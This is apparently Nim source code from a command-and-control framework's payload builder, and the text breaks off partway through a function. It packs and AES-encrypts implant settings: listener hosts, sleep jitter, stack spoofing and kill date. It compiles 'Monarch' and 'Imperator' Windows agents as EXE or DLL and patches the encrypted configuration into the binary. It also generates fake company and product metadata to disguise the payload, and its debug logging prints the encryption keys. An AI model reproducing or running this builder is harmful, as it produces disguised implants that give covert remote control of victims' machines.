import terminal, strformat, strutils, sequtils, tables, system, osproc, streams, os

import ../globals
import ../core/[logger, websocket]
import ../db/database 
import ../../common/[types, utils, serialize, crypto]

const PLACEHOLDER = "PLACEHOLDER"
const IMPERATOR_ROOT = CONQUEST_ROOT / "src" / "imperator"

proc serializeConfiguration(cq: Conquest, listener: Listener, sleepSettings: SleepSettings, killDate: int64): seq[byte] = 
    
    var packer = Packer.init()

    # Add listener configuration
    # Variable length data is prefixed with a 4-byte length indicator

    # Listener configuration
    packer.add(string.toUuid(listener.listenerId))
    packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))

    # Sleep settings
    packer.add(sleepSettings.sleepDelay)
    packer.add(sleepSettings.jitter)
    packer.add(uint8(sleepSettings.sleepTechnique))
    packer.add(uint8(sleepSettings.spoofStack))
    
    # Working hours
    packer.add(uint8(sleepSettings.workingHours.enabled))
    packer.add(uint32(sleepSettings.workingHours.startHour))
    packer.add(uint32(sleepSettings.workingHours.startMinute))
    packer.add(uint32(sleepSettings.workingHours.endHour))
    packer.add(uint32(sleepSettings.workingHours.endMinute))

    # Kill date
    packer.add(uint64(killDate))

    # Public key for key exchange
    packer.addData(cq.keyPair.publicKey)

    # C2 profile
    packer.addDataWithLengthPrefix(string.toBytes(cq.profileString))

    let data = packer.pack() 
    packer.reset() 

    # Encrypt profile configuration data with a newly generated encryption key
    var aesKey = generateBytes(Key) 
    let iv = generateBytes(Iv)

    # Encrypt configuration data
    let (encData, gmac) = encrypt(aesKey, iv, data)

    # Debug: print encryption material
    cq.info(fmt"[CRYPTO] Key[0..15]: {aesKey[0]:02x} {aesKey[1]:02x} {aesKey[2]:02x} {aesKey[3]:02x} {aesKey[4]:02x} {aesKey[5]:02x} {aesKey[6]:02x} {aesKey[7]:02x} {aesKey[8]:02x} {aesKey[9]:02x} {aesKey[10]:02x} {aesKey[11]:02x} {aesKey[12]:02x} {aesKey[13]:02x} {aesKey[14]:02x} {aesKey[15]:02x}")
    cq.info(fmt"[CRYPTO] Key[16..31]: {aesKey[16]:02x} {aesKey[17]:02x} {aesKey[18]:02x} {aesKey[19]:02x} {aesKey[20]:02x} {aesKey[21]:02x} {aesKey[22]:02x} {aesKey[23]:02x} {aesKey[24]:02x} {aesKey[25]:02x} {aesKey[26]:02x} {aesKey[27]:02x} {aesKey[28]:02x} {aesKey[29]:02x} {aesKey[30]:02x} {aesKey[31]:02x}")
    cq.info(fmt"[CRYPTO] IV[0..11]: {iv[0]:02x} {iv[1]:02x} {iv[2]:02x} {iv[3]:02x} {iv[4]:02x} {iv[5]:02x} {iv[6]:02x} {iv[7]:02x} {iv[8]:02x} {iv[9]:02x} {iv[10]:02x} {iv[11]:02x}")
    cq.info(fmt"[CRYPTO] Tag[0..15]: {gmac[0]:02x} {gmac[1]:02x} {gmac[2]:02x} {gmac[3]:02x} {gmac[4]:02x} {gmac[5]:02x} {gmac[6]:02x} {gmac[7]:02x} {gmac[8]:02x} {gmac[9]:02x} {gmac[10]:02x} {gmac[11]:02x} {gmac[12]:02x} {gmac[13]:02x} {gmac[14]:02x} {gmac[15]:02x}")
    cq.info(fmt"[CRYPTO] EncData len: {encData.len}, first bytes: {encData[0]:02x} {encData[1]:02x} {encData[2]:02x} {encData[3]:02x}")

    # Compute XOR checksum of entire encrypted data for verification
    var xorSum: byte = 0
    var addSum: uint32 = 0
    for b in encData:
      xorSum = xorSum xor b
      addSum += b.uint32
    cq.info(fmt"[CRYPTO] EncData checksum: XOR={xorSum:02x}, SUM={addSum}")

    # Show last 16 bytes of ciphertext
    let lastIdx = encData.len - 16
    cq.info(fmt"[CRYPTO] EncData last 16: {encData[lastIdx]:02x} {encData[lastIdx+1]:02x} {encData[lastIdx+2]:02x} {encData[lastIdx+3]:02x} {encData[lastIdx+4]:02x} {encData[lastIdx+5]:02x} {encData[lastIdx+6]:02x} {encData[lastIdx+7]:02x} {encData[lastIdx+8]:02x} {encData[lastIdx+9]:02x} {encData[lastIdx+10]:02x} {encData[lastIdx+11]:02x} {encData[lastIdx+12]:02x} {encData[lastIdx+13]:02x} {encData[lastIdx+14]:02x} {encData[lastIdx+15]:02x}")

    # Add plaintext encryption material in front of the 
    packer.addData(aesKey)
    packer.addData(iv)
    packer.addData(gmac)
    packer.add(uint32(encData.len()))
    let encMaterial = packer.pack() 

    wipeKey(aesKey)

    let finalConfig = encMaterial & encData

    # Debug: print first 64 bytes of final config (should match what agent reads)
    cq.info(fmt"[CRYPTO] Final config len: {finalConfig.len}")
    cq.info(fmt"[CRYPTO] Final config[0..15]: {finalConfig[0]:02x} {finalConfig[1]:02x} {finalConfig[2]:02x} {finalConfig[3]:02x} {finalConfig[4]:02x} {finalConfig[5]:02x} {finalConfig[6]:02x} {finalConfig[7]:02x} {finalConfig[8]:02x} {finalConfig[9]:02x} {finalConfig[10]:02x} {finalConfig[11]:02x} {finalConfig[12]:02x} {finalConfig[13]:02x} {finalConfig[14]:02x} {finalConfig[15]:02x}")
    cq.info(fmt"[CRYPTO] Final config[32..47]: {finalConfig[32]:02x} {finalConfig[33]:02x} {finalConfig[34]:02x} {finalConfig[35]:02x} {finalConfig[36]:02x} {finalConfig[37]:02x} {finalConfig[38]:02x} {finalConfig[39]:02x} {finalConfig[40]:02x} {finalConfig[41]:02x} {finalConfig[42]:02x} {finalConfig[43]:02x} {finalConfig[44]:02x} {finalConfig[45]:02x} {finalConfig[46]:02x} {finalConfig[47]:02x}")
    cq.info(fmt"[CRYPTO] Final config[64..79]: {finalConfig[64]:02x} {finalConfig[65]:02x} {finalConfig[66]:02x} {finalConfig[67]:02x} {finalConfig[68]:02x} {finalConfig[69]:02x} {finalConfig[70]:02x} {finalConfig[71]:02x} {finalConfig[72]:02x} {finalConfig[73]:02x} {finalConfig[74]:02x} {finalConfig[75]:02x} {finalConfig[76]:02x} {finalConfig[77]:02x} {finalConfig[78]:02x} {finalConfig[79]:02x}")

    cq.info("Profile configuration serialized.")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Profile configuration serialized.")

    return finalConfig

proc serializeConfigurationNoAad(cq: Conquest, listener: Listener, sleepSettings: SleepSettings, killDate: int64): seq[byte] =
    ## Serialize configuration for Imperator (uses encryptNoAad - no AAD)

    var packer = Packer.init()

    # Add listener configuration
    packer.add(string.toUuid(listener.listenerId))
    packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))

    # Sleep settings
    packer.add(sleepSettings.sleepDelay)
    packer.add(sleepSettings.jitter)
    packer.add(uint8(sleepSettings.sleepTechnique))
    packer.add(uint8(sleepSettings.spoofStack))

    # Working hours
    packer.add(uint8(sleepSettings.workingHours.enabled))
    packer.add(uint32(sleepSettings.workingHours.startHour))
    packer.add(uint32(sleepSettings.workingHours.startMinute))
    packer.add(uint32(sleepSettings.workingHours.endHour))
    packer.add(uint32(sleepSettings.workingHours.endMinute))

    # Kill date
    packer.add(uint64(killDate))

    # Public key for key exchange
    packer.addData(cq.keyPair.publicKey)

    # C2 profile
    packer.addDataWithLengthPrefix(string.toBytes(cq.profileString))

    let data = packer.pack()
    packer.reset()

    # Encrypt configuration data WITHOUT AAD (for BCrypt compatibility)
    var aesKey = generateBytes(Key)
    let iv = generateBytes(Iv)

    let (encData, gmac) = encryptNoAad(aesKey, iv, data)

    # Debug: print encryption material
    cq.info(fmt"[CRYPTO] Key[0..15]: {aesKey[0]:02x} {aesKey[1]:02x} {aesKey[2]:02x} {aesKey[3]:02x} {aesKey[4]:02x} {aesKey[5]:02x} {aesKey[6]:02x} {aesKey[7]:02x} {aesKey[8]:02x} {aesKey[9]:02x} {aesKey[10]:02x} {aesKey[11]:02x} {aesKey[12]:02x} {aesKey[13]:02x} {aesKey[14]:02x} {aesKey[15]:02x}")
    cq.info(fmt"[CRYPTO] Key[16..31]: {aesKey[16]:02x} {aesKey[17]:02x} {aesKey[18]:02x} {aesKey[19]:02x} {aesKey[20]:02x} {aesKey[21]:02x} {aesKey[22]:02x} {aesKey[23]:02x} {aesKey[24]:02x} {aesKey[25]:02x} {aesKey[26]:02x} {aesKey[27]:02x} {aesKey[28]:02x} {aesKey[29]:02x} {aesKey[30]:02x} {aesKey[31]:02x}")
    cq.info(fmt"[CRYPTO] IV[0..11]: {iv[0]:02x} {iv[1]:02x} {iv[2]:02x} {iv[3]:02x} {iv[4]:02x} {iv[5]:02x} {iv[6]:02x} {iv[7]:02x} {iv[8]:02x} {iv[9]:02x} {iv[10]:02x} {iv[11]:02x}")
    cq.info(fmt"[CRYPTO] Tag[0..15]: {gmac[0]:02x} {gmac[1]:02x} {gmac[2]:02x} {gmac[3]:02x} {gmac[4]:02x} {gmac[5]:02x} {gmac[6]:02x} {gmac[7]:02x} {gmac[8]:02x} {gmac[9]:02x} {gmac[10]:02x} {gmac[11]:02x} {gmac[12]:02x} {gmac[13]:02x} {gmac[14]:02x} {gmac[15]:02x}")
    cq.info(fmt"[CRYPTO] EncData len: {encData.len}, first bytes: {encData[0]:02x} {encData[1]:02x} {encData[2]:02x} {encData[3]:02x}")

    # Compute XOR checksum of entire encrypted data for verification
    var xorSum: byte = 0
    var addSum: uint32 = 0
    for b in encData:
      xorSum = xorSum xor b
      addSum += b.uint32
    cq.info(fmt"[CRYPTO] EncData checksum: XOR={xorSum:02x}, SUM={addSum}")

    # Show last 16 bytes of ciphertext
    let lastIdx = encData.len - 16
    cq.info(fmt"[CRYPTO] EncData last 16: {encData[lastIdx]:02x} {encData[lastIdx+1]:02x} {encData[lastIdx+2]:02x} {encData[lastIdx+3]:02x} {encData[lastIdx+4]:02x} {encData[lastIdx+5]:02x} {encData[lastIdx+6]:02x} {encData[lastIdx+7]:02x} {encData[lastIdx+8]:02x} {encData[lastIdx+9]:02x} {encData[lastIdx+10]:02x} {encData[lastIdx+11]:02x} {encData[lastIdx+12]:02x} {encData[lastIdx+13]:02x} {encData[lastIdx+14]:02x} {encData[lastIdx+15]:02x}")

    # Add plaintext encryption material in front
    packer.addData(aesKey)
    packer.addData(iv)
    packer.addData(gmac)
    packer.add(uint32(encData.len()))
    let encMaterial = packer.pack()

    wipeKey(aesKey)

    let finalConfig = encMaterial & encData

    # Debug: print first 64 bytes of final config
    cq.info(fmt"[CRYPTO] Final config len: {finalConfig.len}")
    cq.info(fmt"[CRYPTO] Final config[0..15]: {finalConfig[0]:02x} {finalConfig[1]:02x} {finalConfig[2]:02x} {finalConfig[3]:02x} {finalConfig[4]:02x} {finalConfig[5]:02x} {finalConfig[6]:02x} {finalConfig[7]:02x} {finalConfig[8]:02x} {finalConfig[9]:02x} {finalConfig[10]:02x} {finalConfig[11]:02x} {finalConfig[12]:02x} {finalConfig[13]:02x} {finalConfig[14]:02x} {finalConfig[15]:02x}")
    cq.info(fmt"[CRYPTO] Final config[32..47]: {finalConfig[32]:02x} {finalConfig[33]:02x} {finalConfig[34]:02x} {finalConfig[35]:02x} {finalConfig[36]:02x} {finalConfig[37]:02x} {finalConfig[38]:02x} {finalConfig[39]:02x} {finalConfig[40]:02x} {finalConfig[41]:02x} {finalConfig[42]:02x} {finalConfig[43]:02x} {finalConfig[44]:02x} {finalConfig[45]:02x} {finalConfig[46]:02x} {finalConfig[47]:02x}")
    cq.info(fmt"[CRYPTO] Final config[64..79]: {finalConfig[64]:02x} {finalConfig[65]:02x} {finalConfig[66]:02x} {finalConfig[67]:02x} {finalConfig[68]:02x} {finalConfig[69]:02x} {finalConfig[70]:02x} {finalConfig[71]:02x} {finalConfig[72]:02x} {finalConfig[73]:02x} {finalConfig[74]:02x} {finalConfig[75]:02x} {finalConfig[76]:02x} {finalConfig[77]:02x} {finalConfig[78]:02x} {finalConfig[79]:02x}")

    cq.info("Profile configuration serialized (NoAAD).")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Profile configuration serialized.")

    return finalConfig

proc replaceAfterPrefix(content, prefix, value: string): string = 
    result = content.splitLines().mapIt(
        if it.startsWith(prefix):
            prefix & '"' & value & '"' 
        else: 
            it
    ).join("\n")
    
proc compile(cq: Conquest, placeholderLength: int, modules: uint32, verbose: bool, architecture: Architecture, customCfg: string = ""): string =

    let configFile = fmt"{CONQUEST_ROOT}/src/agent/nim.cfg"

    # Set output file and build command based on architecture
    # Note: nim.cfg is auto-loaded from src/agent/ directory
    let llvmMingwBin = fmt"{CONQUEST_ROOT}/bin/llvm-mingw-20251216-ucrt-ubuntu-22.04-x86_64/bin"
    let (exeFile, buildCmd) = case architecture:
        of ARCH_X64:
            (fmt"{CONQUEST_ROOT}/bin/monarch.x64.exe",
             fmt"nim -d:mingw --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc c {CONQUEST_ROOT}/src/agent/main.nim")
        of ARCH_ARM64:
            (fmt"{CONQUEST_ROOT}/bin/monarch.arm64.exe",
             fmt"nim -f -d:mingw -d:noRes --os:windows --cpu:arm64 --cc:clang --clang.exe:{llvmMingwBin}/aarch64-w64-mingw32-clang --clang.linkerexe:{llvmMingwBin}/aarch64-w64-mingw32-clang c {CONQUEST_ROOT}/src/agent/main.nim")

    # Apply custom nim.cfg content if provided
    if customCfg.len > 0:
        writeFile(configFile, customCfg)
        cq.info("Applied custom nim.cfg content.")
        cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Applied custom nim.cfg content.")

    # Update placeholder and configuration values
    # NOTE: Only use starting PLACEHOLDER, pad rest with "A"s
    # The trailing PLACEHOLDER was causing Nim to inline the suffix bytes
    # which breaks patching with --mm:none
    let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - len(PLACEHOLDER))
    var config = readFile(configFile)
                    .replaceAfterPrefix("-d:CONFIGURATION=", placeholder)
                    .replaceAfterPrefix("-o:", exeFile)
                    .replaceAfterPrefix("-d:MODULES=", $modules)
                    .replaceAfterPrefix("-d:VERBOSE=", $verbose)
    writeFile(configFile, config)

    cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Placeholder created ({placeholder.len()} bytes).")

    let archStr = if architecture == ARCH_X64: "x64" else: "ARM64"
    cq.info(fmt"Compiling Monarch agent ({archStr}).")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Compiling Monarch ({archStr})...")

    try:
        let process = startProcess("/bin/bash", args=["-c", buildCmd], options={poUsePath, poStdErrToStdOut})
        let outputStream = process.outputStream

        var line: string
        while outputStream.readLine(line):
            cq.output(line)

        let exitCode = process.waitForExit()

        if exitCode == 0:
            cq.info(fmt"Monarch {archStr} payload generated successfully.")
            cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Monarch {archStr} payload generated successfully.")
            return exeFile
        else:
            cq.error(fmt"Monarch build failed with code {exitCode}")
            cq.client.sendBuildlogItem(LOG_ERROR_SHORT, fmt"Build failed with code {exitCode}")
            return ""

    except CatchableError as err:
        cq.error("An error occurred: ", err.msg)
        return ""
    
proc patch(cq: Conquest, unpatchedExePath: string, configuration: seq[byte]): seq[byte] = 
    
    cq.info("Patching profile configuration into agent.")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Patching profile configuration into agent.")

    try: 
        var exeBytes = readFile(unpatchedExePath) 

        # Find ALL occurrences of "PLACEHOLDER" in the binary
        var allPositions: seq[int] = @[]
        var pos = 0
        while true:
            pos = exeBytes.find(PLACEHOLDER, pos)
            if pos == -1:
                break
            allPositions.add(pos)
            pos += 1

        cq.info(fmt"[PATCH] Found {allPositions.len} occurrences of 'PLACEHOLDER' in binary")
        for p in allPositions:
            # Show what PRECEDES each PLACEHOLDER occurrence (look for Nim string header)
            if p >= 8:
                let prevEight = exeBytes[p - 8 .. p - 1]
                cq.info(fmt"[PATCH]   - 0x{p:08X} preceded by: {prevEight[0].byte:02x} {prevEight[1].byte:02x} {prevEight[2].byte:02x} {prevEight[3].byte:02x} {prevEight[4].byte:02x} {prevEight[5].byte:02x} {prevEight[6].byte:02x} {prevEight[7].byte:02x}")
            # Show what follows each PLACEHOLDER occurrence
            if p + PLACEHOLDER.len + 8 <= exeBytes.len:
                let nextEight = exeBytes[p + PLACEHOLDER.len .. p + PLACEHOLDER.len + 7]
                cq.info(fmt"[PATCH]             followed by: {nextEight[0].byte:02x} {nextEight[1].byte:02x} {nextEight[2].byte:02x} {nextEight[3].byte:02x} {nextEight[4].byte:02x} {nextEight[5].byte:02x} {nextEight[6].byte:02x} {nextEight[7].byte:02x} ({nextEight})")
            else:
                cq.info(fmt"[PATCH]   - 0x{p:08X} (at end of file)")

        # Find positions that are starts of the full placeholder (followed by AAAA)
        var positions: seq[int] = @[]
        for p in allPositions:
            if p + PLACEHOLDER.len + 4 <= exeBytes.len:
                let nextFour = exeBytes[p + PLACEHOLDER.len .. p + PLACEHOLDER.len + 3]
                if nextFour == "AAAA":
                    positions.add(p)
                    cq.info(fmt"[PATCH] Position 0x{p:08X} is a placeholder START")

        if positions.len == 0:
            raise newException(CatchableError, "No placeholder start patterns found.")

        cq.info(fmt"[PATCH] Will patch {positions.len} location(s)")

        # Patch ALL found locations
        let configStr = Bytes.toString(configuration)
        cq.info(fmt"[PATCH] Config seq len: {configuration.len}, string len: {configStr.len}")
        cq.info(fmt"[PATCH] Last 4 config bytes: {configuration[^4]:02x} {configuration[^3]:02x} {configuration[^2]:02x} {configuration[^1]:02x}")

        for placeholderPos in positions:
            cq.info(fmt"[PATCH] Patching at offset 0x{placeholderPos:08X}")
            for i, c in configStr:
                exeBytes[placeholderPos + i] = c
            # Verify patch
            cq.info(fmt"[PATCH] Last 4 bytes after patch: {exeBytes[placeholderPos + configuration.len - 4].byte:02x} {exeBytes[placeholderPos + configuration.len - 3].byte:02x} {exeBytes[placeholderPos + configuration.len - 2].byte:02x} {exeBytes[placeholderPos + configuration.len - 1].byte:02x}")

        # POST-PATCH VERIFICATION: Search for any remaining "LDER" that might indicate unpatched placeholder
        var lderPos = 0
        var lderCount = 0
        while true:
            lderPos = exeBytes.find("LDER", lderPos)
            if lderPos == -1:
                break
            # Check if this "LDER" is preceded by "PLACEHO" (part of unpatched PLACEHOLDER)
            if lderPos >= 7 and exeBytes[lderPos - 7 .. lderPos - 1] == "PLACEHO":
                cq.info(fmt"[PATCH] WARNING: Found unpatched PLACEHOLDER ending at 0x{lderPos + 3:08X}")
                lderCount += 1
            lderPos += 1

        if lderCount > 0:
            cq.info(fmt"[PATCH] ERROR: {lderCount} unpatched PLACEHOLDER(s) remain!")
        else:
            cq.info("[PATCH] Verification OK: No unpatched PLACEHOLDER patterns found")

        # Additional diagnostic: search for any "PLACEHOLDERAAAA" pattern remaining
        var diagPos = 0
        var diagCount = 0
        let diagPattern = PLACEHOLDER & "AAAA"
        while true:
            diagPos = exeBytes.find(diagPattern, diagPos)
            if diagPos == -1:
                break
            cq.info(fmt"[PATCH] DIAGNOSTIC: Still found 'PLACEHOLDERAAAA' at 0x{diagPos:08X}")
            diagCount += 1
            diagPos += 1
        cq.info(fmt"[PATCH] DIAGNOSTIC: Total 'PLACEHOLDERAAAA' patterns after patch: {diagCount}")

        # Search for the first 8 bytes of the config to see if they appear multiple times
        let configFirst8 = configStr[0..7]
        var configMatchPos = 0
        var configMatchCount = 0
        while true:
            configMatchPos = exeBytes.find(configFirst8, configMatchPos)
            if configMatchPos == -1:
                break
            cq.info(fmt"[PATCH] DIAGNOSTIC: Config first 8 bytes found at 0x{configMatchPos:08X}")
            configMatchCount += 1
            configMatchPos += 1
        cq.info(fmt"[PATCH] DIAGNOSTIC: Config first 8 bytes appear {configMatchCount} time(s) in binary")

        # Also search for the Nim string length prefix (7268 = 0x1C64 little-endian)
        # Nim strings might have: [length 4/8 bytes][data]
        let lenBytes = "\x64\x1C\x00\x00"  # 7268 as little-endian uint32
        var lenPos = 0
        while true:
            lenPos = exeBytes.find(lenBytes, lenPos)
            if lenPos == -1:
                break
            # Check if this is followed by our placeholder or config data
            if lenPos + 4 + 11 <= exeBytes.len:
                let nextBytes = exeBytes[lenPos + 4 .. lenPos + 14]
                cq.info(fmt"[PATCH] DIAGNOSTIC: Length prefix 0x1C64 at 0x{lenPos:08X}, followed by: {nextBytes}")
            lenPos += 1

        # Find ALL remaining "LDER" occurrences before writing
        var lderSearchPos = 0
        var lderFoundCount = 0
        while true:
            lderSearchPos = exeBytes.find("LDER", lderSearchPos)
            if lderSearchPos == -1:
                break
            # Check context around this LDER
            var context = ""
            if lderSearchPos >= 7:
                context = exeBytes[lderSearchPos - 7 .. lderSearchPos - 1]
            cq.info(fmt"[PATCH] DIAGNOSTIC: 'LDER' at 0x{lderSearchPos:08X}, preceded by: {context}")
            lderFoundCount += 1
            lderSearchPos += 1
        cq.info(fmt"[PATCH] DIAGNOSTIC: Total 'LDER' occurrences in patched binary: {lderFoundCount}")

        # CRITICAL: Search for "AAAAAPLAC" pattern - this is what the agent sees at the end
        # The agent reads "AAAAAPLACEHOLD ER" at positions 7252-7267
        var aaaaplacPos = 0
        var aaaaplacCount = 0
        while true:
            aaaaplacPos = exeBytes.find("AAAAAPLAC", aaaaplacPos)
            if aaaaplacPos == -1:
                break
            cq.info(fmt"[PATCH] CRITICAL: Found 'AAAAAPLAC' at 0x{aaaaplacPos:08X} - THIS IS THE SECOND COPY!")
            aaaaplacCount += 1
            aaaaplacPos += 1
        cq.info(fmt"[PATCH] DIAGNOSTIC: Total 'AAAAAPLAC' occurrences: {aaaaplacCount}")

        writeFile(unpatchedExePath, exeBytes)

        # CRITICAL: Read the file back and verify the patch actually took
        let verifyBytes = readFile(unpatchedExePath)
        let verifyPos = verifyBytes.find("LDER")
        if verifyPos != -1 and verifyPos >= 7 and verifyBytes[verifyPos - 7 .. verifyPos - 1] == "PLACEHO":
            cq.info(fmt"[PATCH] CRITICAL ERROR: File on disk still contains PLACEHOLDER at 0x{verifyPos - 7:08X}!")

        # Show what's actually at the patched location on disk
        for patchPos in positions:
            let endOffset = patchPos + configuration.len - 4
            cq.info(fmt"[PATCH] Disk verify at 0x{patchPos:08X} last 4 bytes: {verifyBytes[endOffset].byte:02x} {verifyBytes[endOffset+1].byte:02x} {verifyBytes[endOffset+2].byte:02x} {verifyBytes[endOffset+3].byte:02x}")

            # Print the ciphertext area (bytes 64-79) for comparison with agent
            let ctStart = patchPos + 64
            if ctStart + 16 <= verifyBytes.len:
                cq.info(fmt"[PATCH] Disk ciphertext[0..15] at 0x{ctStart:08X}: {verifyBytes[ctStart].byte:02x} {verifyBytes[ctStart+1].byte:02x} {verifyBytes[ctStart+2].byte:02x} {verifyBytes[ctStart+3].byte:02x} {verifyBytes[ctStart+4].byte:02x} {verifyBytes[ctStart+5].byte:02x} {verifyBytes[ctStart+6].byte:02x} {verifyBytes[ctStart+7].byte:02x} {verifyBytes[ctStart+8].byte:02x} {verifyBytes[ctStart+9].byte:02x} {verifyBytes[ctStart+10].byte:02x} {verifyBytes[ctStart+11].byte:02x} {verifyBytes[ctStart+12].byte:02x} {verifyBytes[ctStart+13].byte:02x} {verifyBytes[ctStart+14].byte:02x} {verifyBytes[ctStart+15].byte:02x}")

        cq.success(fmt"Agent payload patched successfully: {unpatchedExePath}.")
        cq.client.sendBuildlogItem(LOG_SUCCESS_SHORT, fmt"Agent payload patched successfully: {unpatchedExePath}.")
        return string.toBytes(exeBytes)
    
    except CatchableError as err:
        cq.error("An error occurred: ", err.msg) 
        cq.client.sendBuildlogItem(LOG_ERROR_SHORT, "An error occurred: " & err.msg)
        
    return @[]

# Imperator build functions
proc updateImperatorCfgPlaceholder(cq: Conquest, placeholderLength: int, verbose: bool, outputFormat: OutputFormat, customCfg: string = ""): bool =
    ## Update nim.cfg with CONFIGURATION placeholder for post-build patching
    let cfgPath = fmt"{IMPERATOR_ROOT}/nim.cfg"

    try:
        # Start with custom config if provided, otherwise read existing
        var cfg = if customCfg.len > 0:
            cq.info("Applied custom nim.cfg content.")
            cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Applied custom nim.cfg content.")
            customCfg
        else:
            readFile(cfgPath)

        # Create placeholder pattern - only starting PLACEHOLDER, pad with "A"s
        # NOTE: No trailing PLACEHOLDER - Nim inlines suffix bytes with --mm:none
        let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - len(PLACEHOLDER))

        # Remove existing configuration-related defines
        var newLines: seq[string]
        for line in cfg.splitLines():
            if line.startsWith("-d:DEFAULT_") or
               line.startsWith("-d:SERVER_PUBLIC_KEY") or
               line.startsWith("-d:CONFIGURATION") or
               line.startsWith("-d:malDebug") or
               line.startsWith("-d:dll"):
                continue
            newLines.add(line)

        # Add CONFIGURATION placeholder
        newLines.add("-d:CONFIGURATION=\"" & placeholder & "\"")

        if verbose:
            newLines.add("-d:malDebug")

        if outputFormat == OUTPUT_DLL:
            newLines.add("-d:dll")

        cfg = newLines.join("\n") & "\n"
        writeFile(cfgPath, cfg)

        cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
        cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Placeholder created ({placeholder.len()} bytes).")

        return true

    except CatchableError as err:
        cq.error("Failed to update nim.cfg: ", err.msg)
        return false

proc generateResourceFile(cq: Conquest, metadata: BinaryMetadata, outputPath: string): bool =
    ## Generate Windows resource script (.rc) file
    try:
        # Handle version strings - convert "1.0.0.0" to "1,0,0,0" for VERSIONINFO
        let fileVerComma = if metadata.fileVersion.len > 0:
                               metadata.fileVersion.replace(".", ",")
                           else:
                               "1,0,0,0"
        let prodVerComma = if metadata.productVersion.len > 0:
                               metadata.productVersion.replace(".", ",")
                           else:
                               "1,0,0,0"

        var rcContent = "// Auto-generated resource file\n"

        # Add icon only if not "None"
        if metadata.iconPath != "None" and metadata.iconPath.len > 0:
            rcContent &= fmt"""
1 ICON "{metadata.iconPath}"
"""

        # Add version info if any metadata is provided
        if metadata.productName.len > 0 or metadata.fileDescription.len > 0:
            rcContent &= fmt"""
1 VERSIONINFO
FILEVERSION {fileVerComma}
PRODUCTVERSION {prodVerComma}
FILEFLAGSMASK 0x3fL
FILEFLAGS 0x0L
FILEOS 0x40004L
FILETYPE 0x1L
FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "{metadata.companyName}"
            VALUE "FileDescription", "{metadata.fileDescription}"
            VALUE "FileVersion", "{metadata.fileVersion}"
            VALUE "InternalName", "{metadata.originalFilename}"
            VALUE "LegalCopyright", "{metadata.copyright}"
            VALUE "OriginalFilename", "{metadata.originalFilename}"
            VALUE "ProductName", "{metadata.productName}"
            VALUE "ProductVersion", "{metadata.productVersion}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
"""

        writeFile(outputPath, rcContent)
        cq.info(fmt"Resource file generated: {outputPath}")
        return true

    except CatchableError as err:
        cq.error(fmt"Failed to generate resource file: {err.msg}")
        return false

proc compileResourceFile(cq: Conquest, rcPath: string, resPath: string): bool =
    ## Compile .rc to .res using windres (MinGW)
    try:
        let cmd = fmt"x86_64-w64-mingw32-windres {rcPath} -O coff -o {resPath}"
        cq.info(fmt"Compiling resource: {cmd}")

        let (output, exitCode) = execCmdEx(cmd)
        if exitCode != 0:
            cq.error(fmt"windres failed: {output}")
            return false

        cq.info("Resource file compiled successfully")
        return true

    except CatchableError as err:
        cq.error(fmt"Failed to compile resource file: {err.msg}")
        return false

proc compileImperator(cq: Conquest, outputFormat: OutputFormat, resPath: string = ""): string =
    ## Compile Imperator agent

    let extension = if outputFormat == OUTPUT_DLL: ".dll" else: ".exe"
    let outFile = fmt"{CONQUEST_ROOT}/bin/imperator.x64{extension}"

    let formatStr = if outputFormat == OUTPUT_DLL: "DLL" else: "EXE"
    cq.info(fmt"Compiling Imperator agent ({formatStr}).")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Compiling Imperator ({formatStr})...")

    try:
        # Build command - compile from Imperator directory
        var buildCmd = fmt"cd {IMPERATOR_ROOT} && nim c -o:{outFile}"

        # Add DLL-specific linker flags
        if outputFormat == OUTPUT_DLL:
            buildCmd &= " --passL:-shared --passL:-Wl,-eDllMain"

        # Add resource file if provided
        if resPath.len > 0 and fileExists(resPath):
            buildCmd &= fmt" --passL:{resPath}"
            cq.info(fmt"Including resource file: {resPath}")

        buildCmd &= " src/main.nim"

        let process = startProcess("/bin/bash", args=["-c", buildCmd],
                                   options={poUsePath, poStdErrToStdOut})
        let outputStream = process.outputStream

        var line: string
        while outputStream.readLine(line):
            cq.output(line)

        let exitCode = process.waitForExit()

        if exitCode == 0:
            cq.info(fmt"Imperator {formatStr} payload generated successfully.")
            cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Imperator {formatStr} payload generated successfully.")
            return outFile
        else:
            cq.error("Imperator build failed with code ", $exitCode)
            cq.client.sendBuildlogItem(LOG_ERROR_SHORT, "Build failed with code " & $exitCode)
            return ""

    except CatchableError as err:
        cq.error("An error occurred: ", err.msg)
        return ""

proc imperatorAgentBuild(cq: Conquest, agentBuildInformation: AgentBuildInformation): seq[byte] =
    ## Build Imperator agent with encrypted configuration (placeholder patching)

    cq.info("Building Imperator agent...")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Building Imperator agent...")
    cq.info(fmt"Sleep technique: {agentBuildInformation.sleepSettings.sleepTechnique}, spoofStack: {agentBuildInformation.sleepSettings.spoofStack}")

    # Verify listener exists
    if not cq.dbListenerExists(agentBuildInformation.listenerId):
        cq.error(fmt"Listener {agentBuildInformation.listenerId} does not exist.")
        return @[]

    let listener = cq.listeners[agentBuildInformation.listenerId]

    # Serialize and encrypt configuration (uses encryptNoAad for BCrypt compatibility)
    var config = cq.serializeConfigurationNoAad(listener, agentBuildInformation.sleepSettings, agentBuildInformation.killDate)
